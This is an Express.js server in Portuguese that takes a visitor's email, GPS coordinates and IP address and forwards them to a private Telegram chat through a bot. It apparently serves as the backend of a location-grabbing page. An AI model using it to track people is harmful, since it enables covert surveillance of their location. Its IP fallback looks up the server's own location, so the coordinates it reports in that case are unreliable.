
import express from 'express';
import fetch from 'node-fetch';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();
const app = express();
const port = process.env.PORT || 3000;

// Configurações do Telegram
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Correção para usar __dirname com ESModules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Middlewares
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

//Servindo arquivos estáticos (HTML, CSS, JS) da pasta "public"
app.use(express.static(path.join(__dirname, '../public')));

// Rota que recebe o POST com email, lat, lng
app.post('/send', async (req, res) => {
  const email = req.body.email || 'não informado';

  let lat, lng;
  let mensagem;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

if (!req.body.lat || !req.body.lng) {
  try {
    const ipInfo = await fetch("https://ipapi.co/json/");
    const data = await ipInfo.json();
    lat = data.latitude || 'desconhecido';
    lng = data.longitude || 'desconhecido';
    mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}\nIP: ${ip} loc com ip`;
  } catch (error) {
    lat = 'desconhecido';
    lng = 'desconhecido';
    console.error("Erro ao obter localização por IP:", error);
  }
} else {
  lat = req.body.lat;
  lng = req.body.lng;
  mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}\nIP: ${ip}`;
}

  
  const locationUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`;
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensagem,
      })
    });

    const loc = await fetch(locationUrl, {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        latitude: lat,
        longitude: lng
      })
    });

    const json = await response.json();
    const locationjson = await loc.json();

    if (json.ok && locationjson.ok) {
      res.send("Obrigado! Seus dados foram recebidos");
    } else {
      res.status(500).send("Erro ao enviar para o Telegram.");
    }
  } catch (err) {
    console.error("Erro:", err);
    res.status(500).send("Erro interno.");
  }
});

// Inicia o servidor
app.listen(port, () => {
  console.log(`Servidor rodando em http://localhost:${port}`);
});
